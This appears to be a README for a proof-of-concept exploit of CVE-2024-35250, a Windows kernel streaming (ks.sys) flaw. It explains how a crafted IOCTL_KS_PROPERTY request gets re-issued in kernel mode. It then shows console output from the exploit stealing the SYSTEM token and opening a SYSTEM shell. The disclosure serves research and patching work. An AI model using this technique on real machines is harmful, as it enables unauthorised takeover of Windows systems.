# CVE-2024-35250

**Title:** Windows Kernel-Mode Driver Elevation of Privilege Vulnerability  
**CVE-2024-35250:** https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250  
**Vulnerability Type:** Untrusted Pointer Dereference  
**Tested On:** ks.sys - 10.0.22621.2506    

## Description

CVE-2024-35250 is a logic flaw in the Windows kernelâ€™s streaming (KS.sys) `IOCTL_KS_PROPERTY` handler: its `UnserializePropertySet` path copies a user-provided request and re-issues the IOCTL in kernel mode. By sending a specially crafted `IOCTL_KS_PROPERTY` request with the `KSPROPERTY_TYPE_UNSERIALIZESET` flag, an attacker can trigger this path and force the driver to execute the IOCTL again with Irp->RequestorMode = Kernel, effectively granting an arbitrary kernel-mode IOCTL primitive for privilege escalation.

## Exploit

Tested on: Windows 11 23H2 (05-2024 Build)

```
PS C:\Users\h4x\Desktop> whoami
desktop-3rgmcon\h4x
PS C:\Users\h4x\Desktop> .\CVE-2024-35250.exe
[+] Successfully opened DRM descrambler device!
[+] NT base address fffff8066ba00000
[+] Found EPROCESS of the current process FFFFBA81E8D130C0
[+] Found KTHREAD of the current thread FFFFBA81E57EE080
[+] Found EPROCESS of the system.exe FFFFBA81E0AB9040
[+] pFakeBitmapAddr = 0x0000000010000000
[+] Calling Kernel Streaming....
[+] Stealing system's Token..
[+] Replacing KTHREAD.PreviousMode as UserMode..
[+] Spawning shell as SYSTEM...
Microsoft Windows [Version 10.0.22631.3593]
(c) Microsoft Corporation. All rights reserved.

C:\Users\h4x\Desktop>whoami
nt authority\system
```

## Acknowledgements

- The original research on Kernel Streaming was conducted by [Angelboy](https://x.com/scwuaptx), and it can be found [here](https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/).
- The [PoC](https://github.com/varwara/CVE-2024-35250/) was developed by Varwara, and the above PoC is based on it.
